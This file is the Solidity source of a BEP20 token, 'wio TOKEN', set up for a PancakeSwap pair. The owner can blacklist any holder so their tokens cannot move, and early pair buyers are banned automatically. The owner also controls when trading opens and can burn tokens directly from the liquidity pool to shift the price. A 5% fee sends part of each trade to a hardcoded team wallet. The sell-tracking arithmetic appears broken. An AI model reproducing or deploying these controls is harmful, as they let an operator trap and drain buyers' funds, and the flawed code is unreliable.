// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;
import "./IBEP20.sol";
import "./SafeMath.sol";

interface IpancakePair
{
    function sync() external;
}
 
contract wioToken is IBEP20
{
    using SafeMath for uint256;
    address _owner;
    address _team=0x54b17f6a41851c077376D63977d02Ac09edc42B0;
    string constant  _name = 'wio TOKEN';
    string constant _symbol = 'wio';
    uint8 immutable _decimals = 18;
 
    address _pancakeAddress;
    uint256 _totalsupply;  

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address=>bool) _isExcluded;
    mapping(address=>bool) _banneduser;
    mapping(address=>uint256) _balances;
    bool _allowtransfer;
    uint256 _unburnedSell;
    uint256 _starttradeblock;
 
    constructor( )
    {
        _owner = msg.sender;
       _mint(0x1024ea9333F2F60501BA8620AbFD0656Dc228BEe,100000000 * 1e18);
       _isExcluded[_owner]=true;
       _isExcluded[0x1024ea9333F2F60501BA8620AbFD0656Dc228BEe]=true;
       _allowtransfer=false;
       _starttradeblock= 1e30;
    }

    function setTeam(address team) public
    {
         require(msg.sender==_owner);
         _team = team;
    }

    function BannUser(address user,bool ban) public
    {
         require(msg.sender==_owner);
         _banneduser[user]=ban;
    }

    function setPancakeAddress(address pancakeAddress) public
    {
        require(msg.sender==_owner);
        _pancakeAddress=pancakeAddress;
    }

    function name() public  pure returns (string memory) {
        return _name;
    }

    function symbol() public  pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalsupply;
    }

    function AddExcluded(address account,bool a) public 
    {
        require(msg.sender== _owner);
        _isExcluded[account] =a;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function takeOutErrorTransfer(address tokenaddress) public
    {
        require(msg.sender==_owner);
        IBEP20(tokenaddress).transfer(_owner, IBEP20(tokenaddress).balanceOf(address(this)));
    }

    function _mint(address account, uint256 amount) private {
        require(account != address(0), 'BEP20: mint to the zero address');
        _totalsupply=_totalsupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }

   function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function burnFrom(address sender, uint256 amount) public override  returns (bool)
    {
         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _burn(sender,amount);
        return true;
    }

    function burn(uint256 amount) public override returns (bool)
    {
        _burn(msg.sender,amount);
        return true;
    }
 
    function _burn(address sender,uint256 tAmount) private
    {
         require(sender != address(0), "ERC20: transfer from the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[address(0)] = _balances[address(0)].add(tAmount); 
         emit Transfer(sender, address(0), tAmount);
    }

    function BurnPool() public
    {
        require(msg.sender== _owner);
        if(balanceOf(_pancakeAddress)>_unburnedSell)
            _burn(_pancakeAddress,_unburnedSell);

        _unburnedSell=0;
        IpancakePair(_pancakeAddress).sync();
    }

    function startTrade() public
    {
        require(msg.sender== _owner);
        _starttradeblock=block.number;
        _allowtransfer=true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_banneduser[sender]==false,"banned");
        

        require(_allowtransfer || isExcluded(sender),"Transfer not open yet");

        if(sender==_pancakeAddress)
        {
            if(block.number < _starttradeblock + 3)
                _banneduser[recipient]=true;
        }

        uint256 toamount=amount;

        if(!isExcluded(sender) && !isExcluded(recipient))
        {
            uint256 onepct = amount.div(100);

            if(onepct > 0)
            {
                _balances[address(0)] = _balances[address(0)].add(onepct.mul(3)); 
                emit Transfer(sender, address(0), onepct.mul(3));

                _balances[_team]= _balances[_team].add( onepct.mul(2)); 
                 emit Transfer(sender, _team, onepct.mul(2));

                toamount = amount.sub(onepct.mul(5));
            }

            if(recipient==_pancakeAddress)
            {
                _unburnedSell=_unburnedSell.add(toamount).div(10);
            }
        }

        _balances[sender]= _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(toamount); 
        emit Transfer(sender, recipient, toamount);
    }

    
}